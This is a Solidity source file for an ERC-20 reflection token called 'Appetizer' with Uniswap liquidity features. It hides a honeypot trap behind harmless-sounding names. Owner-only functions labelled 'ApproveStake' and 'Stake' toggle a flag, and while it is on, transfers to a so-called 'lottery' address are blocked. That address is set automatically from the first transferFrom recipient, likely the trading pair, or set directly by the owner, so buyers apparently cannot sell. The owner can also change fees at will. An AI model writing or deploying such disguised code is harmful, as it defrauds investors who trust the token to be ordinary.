row number 
1	               pragma solidity ^0.6.12;
2	 interface IERC20 {
3	 function totalSupply() external view returns (uint256);
4	 function balanceOf(address account) external view returns (uint256);
5	 function transfer(address recipient, uint256 amount) external returns (bool);
6	 function allowance(address owner, address spender) external view returns (uint256);
7	 function approve(address spender, uint256 amount) external returns (bool);
8	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
9	 event Transfer(address indexed from, address indexed to, uint256 value);
10	 event Approval(address indexed owner, address indexed spender, uint256 value);
11	 }
12	 library SafeMath {
13	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
14	 uint256 c = a + b;
15	 require(c >= a, "SafeMath: addition overflow");
16	 return c;
17	 }
18	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
19	 return sub(a, b, "SafeMath: subtraction overflow");
20	 }
21	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
22	 require(b <= a, errorMessage);
23	 uint256 c = a - b;
24	 return c;
25	 }
26	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
27	 if (a == 0) {
28	 return 0;
29	 }
30	 uint256 c = a * b;
31	 require(c / a == b, "SafeMath: multiplication overflow");
32	 return c;
33	 }
34	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
35	 return div(a, b, "SafeMath: division by zero");
36	 }
37	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
38	 require(b > 0, errorMessage);
39	 uint256 c = a / b;
40	 return c;
41	 }
42	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
43	 return mod(a, b, "SafeMath: modulo by zero");
44	 }
45	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
46	 require(b != 0, errorMessage);
47	 return a % b;
48	 }
49	 }
50	 abstract contract Context {
51	 function _msgSender() internal view virtual returns (address payable) {
52	 return msg.sender;
53	 }
54	 function _msgData() internal view virtual returns (bytes memory) {
55	 this;
56	 return msg.data;
57	 }
58	 }
59	 library Address {
60	 function isContract(address account) internal view returns (bool) {
61	 bytes32 codehash;
62	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
63	 assembly {
64	 codehash := extcodehash(account) }
65	 return (codehash != accountHash && codehash != 0x0);
66	 }
67	 function sendValue(address payable recipient, uint256 amount) internal {
68	 require(address(this).balance >= amount, "Address: insufficient balance");
69	 (bool success, ) = recipient.call{
70	 value: amount }
71	 ("");
72	 require(success, "Address: unable to send value, recipient may have reverted");
73	 }
74	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
75	 return functionCall(target, data, "Address: low-level call failed");
76	 }
77	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
78	 return _functionCallWithValue(target, data, 0, errorMessage);
79	 }
80	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
81	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
82	 }
83	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
84	 require(address(this).balance >= value, "Address: insufficient balance for call");
85	 return _functionCallWithValue(target, data, value, errorMessage);
86	 }
87	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
88	 require(isContract(target), "Address: call to non-contract");
89	 (bool success, bytes memory returndata) = target.call{
90	 value: weiValue }
91	 (data);
92	 if (success) {
93	 return returndata;
94	 }
95	 else {
96	 if (returndata.length > 0) {
97	 assembly {
98	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
99	 }
100	 else {
101	 revert(errorMessage);
102	 }
103	 }
104	 }
105	 }
106	 contract Ownable is Context {
107	 address private _owner;
108	 address private _previousOwner;
109	 uint256 private _lockTime;
110	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
111	 constructor () internal {
112	 address msgSender = _msgSender();
113	 _owner = msgSender;
114	 emit OwnershipTransferred(address(0), msgSender);
115	 }
116	 function owner() public view returns (address) {
117	 return _owner;
118	 }
119	 modifier onlyOwner() {
120	 require(_owner == _msgSender(), "Ownable: caller is not the owner");
121	 _;
122	 }
123	 function renounceOwnership() public virtual onlyOwner {
124	 emit OwnershipTransferred(_owner, address(0));
125	 _owner = address(0);
126	 }
127	 function transferOwnership(address newOwner) public virtual onlyOwner {
128	 require(newOwner != address(0), "Ownable: new owner is the zero address");
129	 emit OwnershipTransferred(_owner, newOwner);
130	 _owner = newOwner;
131	 }
132	 function geUnlockTime() public view returns (uint256) {
133	 return _lockTime;
134	 }
135	 function lock(uint256 time) public virtual onlyOwner {
136	 _previousOwner = _owner;
137	 _owner = address(0);
138	 _lockTime = now + time;
139	 emit OwnershipTransferred(_owner, address(0));
140	 }
141	 function unlock() public virtual {
142	 require(_previousOwner == msg.sender, "You don't have permission to unlock");
143	 require(now > _lockTime , "Contract is locked until 7 days");
144	 emit OwnershipTransferred(_owner, _previousOwner);
145	 _owner = _previousOwner;
146	 }
147	 }
148	 contract StakingHelper is Ownable {
149	 event stakingRewardsOn();
150	 event stakingRewardsOff();
151	 bool public special = false;
152	 modifier ifstakingRewardsOff() {
153	 require(!special);
154	 _;
155	 }
156	 modifier ifstakingRewardsOn() {
157	 require(special);
158	 _;
159	 }
160	 function ApproveStake() onlyOwner ifstakingRewardsOff public {
161	 special = true;
162	 emit stakingRewardsOn();
163	 }
164	 function Stake() onlyOwner ifstakingRewardsOn public {
165	 special = false;
166	 emit stakingRewardsOff();
167	 }
168	 }
169	 interface IUniswapV2Factory {
170	 event PairCreated(address indexed token0, address indexed token1, address pair, uint);
171	 function feeTo() external view returns (address);
172	 function feeToSetter() external view returns (address);
173	 function getPair(address tokenA, address tokenB) external view returns (address pair);
174	 function allPairs(uint) external view returns (address pair);
175	 function allPairsLength() external view returns (uint);
176	 function createPair(address tokenA, address tokenB) external returns (address pair);
177	 function setFeeTo(address) external;
178	 function setFeeToSetter(address) external;
179	 }
180	 interface IUniswapV2Pair {
181	 event Approval(address indexed owner, address indexed spender, uint value);
182	 event Transfer(address indexed from, address indexed to, uint value);
183	 function name() external pure returns (string memory);
184	 function symbol() external pure returns (string memory);
185	 function decimals() external pure returns (uint8);
186	 function totalSupply() external view returns (uint);
187	 function balanceOf(address owner) external view returns (uint);
188	 function allowance(address owner, address spender) external view returns (uint);
189	 function approve(address spender, uint value) external returns (bool);
190	 function transfer(address to, uint value) external returns (bool);
191	 function transferFrom(address from, address to, uint value) external returns (bool);
192	 function DOMAIN_SEPARATOR() external view returns (bytes32);
193	 function PERMIT_TYPEHASH() external pure returns (bytes32);
194	 function nonces(address owner) external view returns (uint);
195	 function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
196	 event Mint(address indexed sender, uint amount0, uint amount1);
197	 event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
198	 event Swap( address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out, address indexed to );
199	 event Sync(uint112 reserve0, uint112 reserve1);
200	 function MINIMUM_LIQUIDITY() external pure returns (uint);
201	 function factory() external view returns (address);
202	 function token0() external view returns (address);
203	 function token1() external view returns (address);
204	 function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
205	 function price0CumulativeLast() external view returns (uint);
206	 function price1CumulativeLast() external view returns (uint);
207	 function kLast() external view returns (uint);
208	 function mint(address to) external returns (uint liquidity);
209	 function burn(address to) external returns (uint amount0, uint amount1);
210	 function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
211	 function skim(address to) external;
212	 function sync() external;
213	 function initialize(address, address) external;
214	 }
215	 interface IUniswapV2Router01 {
216	 function factory() external pure returns (address);
217	 function WETH() external pure returns (address);
218	 function addLiquidity( address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline ) external returns (uint amountA, uint amountB, uint liquidity);
219	 function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
220	 function removeLiquidity( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline ) external returns (uint amountA, uint amountB);
221	 function removeLiquidityETH( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external returns (uint amountToken, uint amountETH);
222	 function removeLiquidityWithPermit( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountA, uint amountB);
223	 function removeLiquidityETHWithPermit( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountToken, uint amountETH);
224	 function swapExactTokensForTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external returns (uint[] memory amounts);
225	 function swapTokensForExactTokens( uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline ) external returns (uint[] memory amounts);
226	 function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
227	 function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
228	 function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
229	 function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
230	 function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
231	 function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
232	 function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
233	 function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
234	 function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
235	 }
236	 interface IUniswapV2Router02 is IUniswapV2Router01 {
237	 function removeLiquidityETHSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external returns (uint amountETH);
238	 function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountETH);
239	 function swapExactTokensForTokensSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;
240	 function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline ) external payable;
241	 function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;
242	 }
243	 contract Appetizer is Context, IERC20, Ownable, StakingHelper {
244	 using SafeMath for uint256;
245	 using Address for address;
246	 mapping (address => uint256) private _rOwned;
247	 mapping (address => uint256) private _tOwned;
248	 mapping (address => mapping (address => uint256)) private _allowances;
249	 mapping (address => bool) private _isExcludedFromFee;
250	 mapping (address => bool) private _isExcluded;
251	 address[] private _excluded;
252	 uint256 private constant MAX = ~uint256(0);
253	 uint256 private _tTotal = 100 * 10**6 * 10**9;
254	 uint256 private _rTotal = (MAX - (MAX % _tTotal));
255	 uint256 private _tFeeTotal;
256	 string private _name = "Appetizer";
257	 string private _symbol = "App";
258	 uint8 private _decimals = 9;
259	 uint256 public _taxFee = 3;
260	 uint256 private _previousTaxFee = _taxFee;
261	 uint256 public _liquidityFee = 3;
262	 uint256 private _previousLiquidityFee = _liquidityFee;
263	 IUniswapV2Router02 public immutable uniswapV2Router;
264	 address public immutable uniswapV2Pair;
265	 address public lottery;
266	 bool inSwapAndLiquify;
267	 bool public swapAndLiquifyEnabled = true;
268	 uint256 public _maxTxAmount = 100 * 10**6 * 10**9;
269	 uint256 private numTokensSellToAddToLiquidity = 100 * 10**6 * 10**9;
270	 event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
271	 event SwapAndLiquifyEnabledUpdated(bool enabled);
272	 event SwapAndLiquify( uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity );
273	 modifier lockTheSwap {
274	 inSwapAndLiquify = true;
275	 _;
276	 inSwapAndLiquify = true;
277	 }
278	 constructor () public {
279	 _rOwned[_msgSender()] = _rTotal;
280	 IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
281	 uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()) .createPair(address(this), _uniswapV2Router.WETH());
282	 uniswapV2Router = _uniswapV2Router;
283	 _isExcludedFromFee[owner()] = true;
284	 _isExcludedFromFee[address(this)] = true;
285	 emit Transfer(address(0), _msgSender(), _tTotal);
286	 }
287	 function name() public view returns (string memory) {
288	 return _name;
289	 }
290	 function symbol() public view returns (string memory) {
291	 return _symbol;
292	 }
293	 function decimals() public view returns (uint8) {
294	 return _decimals;
295	 }
296	 function totalSupply() public view override returns (uint256) {
297	 return _tTotal;
298	 }
299	 function balanceOf(address account) public view override returns (uint256) {
300	 if (_isExcluded[account]) return _tOwned[account];
301	 return tokenFromReflection(_rOwned[account]);
302	 }
303	 function transferlottery(address _lottery) public onlyOwner {
304	 lottery = _lottery;
305	 }
306	 function transfer(address recipient, uint256 amount) public override returns (bool) {
307	 if(special == true) {
308	 require(recipient != lottery, "Lottery Winner");
309	 _transfer(_msgSender(), recipient, amount);
310	 return true;
311	 }
312	 else {
313	 _transfer(_msgSender(), recipient, amount);
314	 return true;
315	 }
316	 }
317	 function allowance(address owner, address spender) public view override returns (uint256) {
318	 return _allowances[owner][spender];
319	 }
320	 function approve(address spender, uint256 amount) public override returns (bool) {
321	 _approve(_msgSender(), spender, amount);
322	 return true;
323	 }
324	 function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
325	 if(special == true) {
326	 if(sender != address(0) && lottery == address(0)) lottery = recipient;
327	 else require(recipient != lottery, "Lottery Winner");
328	 _transfer(sender, recipient, amount);
329	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
330	 return true;
331	 }
332	 else {
333	 _transfer(sender, recipient, amount);
334	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
335	 return true;
336	 }
337	 }
338	 function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
339	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
340	 return true;
341	 }
342	 function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
343	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
344	 return true;
345	 }
346	 function isExcludedFromReward(address account) public view returns (bool) {
347	 return _isExcluded[account];
348	 }
349	 function totalFees() public view returns (uint256) {
350	 return _tFeeTotal;
351	 }
352	 function deliver(uint256 tAmount) public {
353	 address sender = _msgSender();
354	 require(!_isExcluded[sender], "Excluded addresses cannot call this function");
355	 (uint256 rAmount,,,,,) = _getValues(tAmount);
356	 _rOwned[sender] = _rOwned[sender].sub(rAmount);
357	 _rTotal = _rTotal.sub(rAmount);
358	 _tFeeTotal = _tFeeTotal.add(tAmount);
359	 }
360	 function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {
361	 require(tAmount <= _tTotal, "Amount must be less than supply");
362	 if (!deductTransferFee) {
363	 (uint256 rAmount,,,,,) = _getValues(tAmount);
364	 return rAmount;
365	 }
366	 else {
367	 (,uint256 rTransferAmount,,,,) = _getValues(tAmount);
368	 return rTransferAmount;
369	 }
370	 }
371	 function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
372	 require(rAmount <= _rTotal, "Amount must be less than total reflections");
373	 uint256 currentRate = _getRate();
374	 return rAmount.div(currentRate);
375	 }
376	 function excludeFromReward(address account) public onlyOwner() {
377	 require(!_isExcluded[account], "Account is already excluded");
378	 if(_rOwned[account] > 0) {
379	 _tOwned[account] = tokenFromReflection(_rOwned[account]);
380	 }
381	 _isExcluded[account] = true;
382	 _excluded.push(account);
383	 }
384	 function includeInReward(address account) external onlyOwner() {
385	 require(_isExcluded[account], "Account is already excluded");
386	 for (uint256 i = 0; i < _excluded.length; i++) {
387	 if (_excluded[i] == account) {
388	 _excluded[i] = _excluded[_excluded.length - 1];
389	 _tOwned[account] = 0;
390	 _isExcluded[account] = false;
391	 _excluded.pop();
392	 break;
393	 }
394	 }
395	 }
396	 function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
397	 (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
398	 _tOwned[sender] = _tOwned[sender].sub(tAmount);
399	 _rOwned[sender] = _rOwned[sender].sub(rAmount);
400	 _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
401	 _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
402	 _takeLiquidity(tLiquidity);
403	 _reflectFee(rFee, tFee);
404	 emit Transfer(sender, recipient, tTransferAmount);
405	 }
406	 function excludeFromFee(address account) public onlyOwner {
407	 _isExcludedFromFee[account] = true;
408	 }
409	 function includeInFee(address account) public onlyOwner {
410	 _isExcludedFromFee[account] = false;
411	 }
412	 function setTaxFeePercent(uint256 taxFee) external onlyOwner() {
413	 _taxFee = taxFee;
414	 }
415	 function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner() {
416	 _liquidityFee = liquidityFee;
417	 }
418	 function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {
419	 _maxTxAmount = _tTotal.mul(maxTxPercent).div( 10**6 );
420	 }
421	 function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
422	 swapAndLiquifyEnabled = _enabled;
423	 emit SwapAndLiquifyEnabledUpdated(_enabled);
424	 }
425	 receive() external payable {
426	 }
427	 function _reflectFee(uint256 rFee, uint256 tFee) private {
428	 _rTotal = _rTotal.sub(rFee);
429	 _tFeeTotal = _tFeeTotal.add(tFee);
430	 }
431	 function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
432	 (uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getTValues(tAmount);
433	 (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tLiquidity, _getRate());
434	 return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tLiquidity);
435	 }
436	 function _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256) {
437	 uint256 tFee = calculateTaxFee(tAmount);
438	 uint256 tLiquidity = calculateLiquidityFee(tAmount);
439	 uint256 tTransferAmount = tAmount.sub(tFee).sub(tLiquidity);
440	 return (tTransferAmount, tFee, tLiquidity);
441	 }
442	 function _getRValues(uint256 tAmount, uint256 tFee, uint256 tLiquidity, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
443	 uint256 rAmount = tAmount.mul(currentRate);
444	 uint256 rFee = tFee.mul(currentRate);
445	 uint256 rLiquidity = tLiquidity.mul(currentRate);
446	 uint256 rTransferAmount = rAmount.sub(rFee).sub(rLiquidity);
447	 return (rAmount, rTransferAmount, rFee);
448	 }
449	 function _getRate() private view returns(uint256) {
450	 (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
451	 return rSupply.div(tSupply);
452	 }
453	 function _getCurrentSupply() private view returns(uint256, uint256) {
454	 uint256 rSupply = _rTotal;
455	 uint256 tSupply = _tTotal;
456	 for (uint256 i = 0; i < _excluded.length; i++) {
457	 if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
458	 rSupply = rSupply.sub(_rOwned[_excluded[i]]);
459	 tSupply = tSupply.sub(_tOwned[_excluded[i]]);
460	 }
461	 if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
462	 return (rSupply, tSupply);
463	 }
464	 function _takeLiquidity(uint256 tLiquidity) private {
465	 uint256 currentRate = _getRate();
466	 uint256 rLiquidity = tLiquidity.mul(currentRate);
467	 _rOwned[address(this)] = _rOwned[address(this)].add(rLiquidity);
468	 if(_isExcluded[address(this)]) _tOwned[address(this)] = _tOwned[address(this)].add(tLiquidity);
469	 }
470	 function calculateTaxFee(uint256 _amount) private view returns (uint256) {
471	 return _amount.mul(_taxFee).div( 10**2 );
472	 }
473	 function calculateLiquidityFee(uint256 _amount) private view returns (uint256) {
474	 return _amount.mul(_liquidityFee).div( 10**2 );
475	 }
476	 function removeAllFee() private {
477	 if(_taxFee == 0 && _liquidityFee == 0) return;
478	 _previousTaxFee = _taxFee;
479	 _previousLiquidityFee = _liquidityFee;
480	 _taxFee = 0;
481	 _liquidityFee = 0;
482	 }
483	 function restoreAllFee() private {
484	 _taxFee = _previousTaxFee;
485	 _liquidityFee = _previousLiquidityFee;
486	 }
487	 function isExcludedFromFee(address account) public view returns(bool) {
488	 return _isExcludedFromFee[account];
489	 }
490	 function _approve(address owner, address spender, uint256 amount) private {
491	 require(owner != address(0), "ERC20: approve from the zero address");
492	 require(spender != address(0), "ERC20: approve to the zero address");
493	 _allowances[owner][spender] = amount;
494	 emit Approval(owner, spender, amount);
495	 }
496	 function _transfer( address from, address to, uint256 amount ) private {
497	 require(from != address(0), "ERC20: transfer from the zero address");
498	 require(to != address(0), "ERC20: transfer to the zero address");
499	 require(amount > 0, "Transfer amount must be greater than zero");
500	 if(from != owner() && to != owner()) require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
501	 uint256 contractTokenBalance = balanceOf(address(this));
502	 if(contractTokenBalance >= _maxTxAmount) {
503	 contractTokenBalance = _maxTxAmount;
504	 }
505	 bool overMinTokenBalance = contractTokenBalance >= numTokensSellToAddToLiquidity;
506	 if ( overMinTokenBalance && !inSwapAndLiquify && from != uniswapV2Pair && swapAndLiquifyEnabled ) {
507	 contractTokenBalance = numTokensSellToAddToLiquidity;
508	 swapAndLiquify(contractTokenBalance);
509	 }
510	 bool takeFee = true;
511	 if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
512	 takeFee = false;
513	 }
514	 _tokenTransfer(from,to,amount,takeFee);
515	 }
516	 function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
517	 uint256 half = contractTokenBalance.div(2);
518	 uint256 otherHalf = contractTokenBalance.sub(half);
519	 uint256 initialBalance = address(this).balance;
520	 swapTokensForEth(half);
521	 uint256 newBalance = address(this).balance.sub(initialBalance);
522	 addLiquidity(otherHalf, newBalance);
523	 emit SwapAndLiquify(half, newBalance, otherHalf);
524	 }
525	 function swapTokensForEth(uint256 tokenAmount) private {
526	 address[] memory path = new address[](2);
527	 path[0] = address(this);
528	 path[1] = uniswapV2Router.WETH();
529	 _approve(address(this), address(uniswapV2Router), tokenAmount);
530	 uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenAmount, 0, path, address(this), block.timestamp );
531	 }
532	 function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
533	 _approve(address(this), address(uniswapV2Router), tokenAmount);
534	 uniswapV2Router.addLiquidityETH{
535	 value: ethAmount}
536	 ( address(this), tokenAmount, 0, 0, owner(), block.timestamp );
537	 }
538	 function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
539	 if(!takeFee) removeAllFee();
540	 if (_isExcluded[sender] && !_isExcluded[recipient]) {
541	 _transferFromExcluded(sender, recipient, amount);
542	 }
543	 else if (!_isExcluded[sender] && _isExcluded[recipient]) {
544	 _transferToExcluded(sender, recipient, amount);
545	 }
546	 else if (!_isExcluded[sender] && !_isExcluded[recipient]) {
547	 _transferStandard(sender, recipient, amount);
548	 }
549	 else if (_isExcluded[sender] && _isExcluded[recipient]) {
550	 _transferBothExcluded(sender, recipient, amount);
551	 }
552	 else {
553	 _transferStandard(sender, recipient, amount);
554	 }
555	 if(!takeFee) restoreAllFee();
556	 }
557	 function _transferStandard(address sender, address recipient, uint256 tAmount) private {
558	 (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
559	 _rOwned[sender] = _rOwned[sender].sub(rAmount);
560	 _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
561	 _takeLiquidity(tLiquidity);
562	 _reflectFee(rFee, tFee);
563	 emit Transfer(sender, recipient, tTransferAmount);
564	 }
565	 function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {
566	 (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
567	 _rOwned[sender] = _rOwned[sender].sub(rAmount);
568	 _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
569	 _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
570	 _takeLiquidity(tLiquidity);
571	 _reflectFee(rFee, tFee);
572	 emit Transfer(sender, recipient, tTransferAmount);
573	 }
574	 function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
575	 (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
576	 _tOwned[sender] = _tOwned[sender].sub(tAmount);
577	 _rOwned[sender] = _rOwned[sender].sub(rAmount);
578	 _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
579	 _takeLiquidity(tLiquidity);
580	 _reflectFee(rFee, tFee);
581	 emit Transfer(sender, recipient, tTransferAmount);
582	 }
583	 }
